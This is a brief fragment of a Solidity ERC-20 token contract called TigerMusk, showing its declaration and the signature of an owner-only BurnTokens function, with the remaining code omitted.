...
contract TigerMusk is Context, IERC20, IERC20Metadata, Ownable {   
    ...
    function BurnTokens(uint256 amount) public onlyOwner virtual returns (bool) {
